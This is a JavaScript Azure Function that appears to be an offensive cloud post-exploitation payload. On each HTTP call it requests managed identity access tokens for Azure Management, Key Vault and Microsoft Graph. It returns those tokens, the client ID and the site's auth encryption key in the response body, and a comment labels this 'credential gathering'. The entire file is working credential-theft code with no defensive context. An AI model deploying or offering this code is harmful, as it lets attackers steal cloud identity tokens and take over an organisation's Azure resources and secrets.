module.exports = async function (context, req) {
    
    // Get environment variables
    let identityEndpoint = process.env.IDENTITY_ENDPOINT;
    let identityHeader = process.env.IDENTITY_HEADER;
    let decryptionKeyId = process.env.WEBSITE_AUTH_ENCRYPTION_KEY;

    let combinedResponse = {};

    // Check if MI set
    if(identityEndpoint && identityHeader) {
        
        let resourceURI  = "https://management.azure.com";
        let vaultURI = "https://vault.azure.net";
        let graphURI = "https://graph.microsoft.com";
        let apiVersion = "2019-08-01";
        let headers = {"X-IDENTITY-HEADER": identityHeader};
        let params = {};

        // Perform credential gathering requests
        try {

            // Get Management token and client ID
            params = {"resource": resourceURI, "api-version": apiVersion};
            let fullRequestUrl = createURLwithParams(params, identityEndpoint);

            let mgmt_body = await nodeGetJsonRequest(fullRequestUrl, headers);
            combinedResponse.clientId = mgmt_body.client_id;
            combinedResponse.managementToken = mgmt_body.access_token;

            // Get Vault token
            params = {"resource": vaultURI, "api-version": apiVersion};
            fullRequestUrl = createURLwithParams(params, identityEndpoint);

            let vault_body = await nodeGetJsonRequest(fullRequestUrl, headers);
            combinedResponse.vaultToken = vault_body.access_token;

            // Get Graph token
            params = {"resource": graphURI, "api-version": apiVersion};
            fullRequestUrl = createURLwithParams(params, identityEndpoint);

            let graph_body = await nodeGetJsonRequest(fullRequestUrl, headers);
            combinedResponse.graphToken = graph_body.access_token;

        }
        catch(e) {
            console.log(e);
        }

    }

    // Return AzureWebEncryptionKey even if everything else failed
    combinedResponse.decryptionKeyId = decryptionKeyId;

    context.res = {
        body: combinedResponse
    };

}

// Creates URL string with parameters.
function createURLwithParams(params, identityEndpoint) {
    let urlParamString = new URLSearchParams(params).toString();
    let fullRequestUrl = `${identityEndpoint}?${urlParamString}`;
    return fullRequestUrl;
}

// Performs a GET request to the endpoint with headers. Returns JSON response.
async function nodeGetJsonRequest(fullRequestUrl, headers) {
    let result = await fetch(fullRequestUrl, {
        method: "GET",
        headers: headers
    });
    return result.json();
}